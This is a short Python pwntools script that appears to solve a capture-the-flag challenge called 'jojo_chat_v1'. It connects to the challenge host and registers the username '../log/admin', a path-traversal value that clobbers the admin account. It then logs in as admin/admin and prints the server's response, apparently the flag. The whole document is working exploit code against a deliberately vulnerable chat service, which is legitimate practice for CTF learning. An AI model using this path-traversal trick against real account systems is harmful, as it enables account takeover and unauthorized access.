#!/usr/bin/env python3
from pwn import *

p = remote('nopsctf-4cadaab63f67-jojo_chat_v1-0.chals.io', 443, ssl=True)

p.sendlineafter(b'3) Leave\n', b'1')
p.sendlineafter(b'username: ', b'../log/admin')
p.sendlineafter(b'password: ', b'admin')

p.sendlineafter(b'3) Leave\n', b'2')
p.sendlineafter(b'Username: ', b'admin')
p.sendlineafter(b'Password: ', b'admin')

p.sendlineafter(b'3) Logout\n', b'admin')
p.recvline()
print(p.recvline())
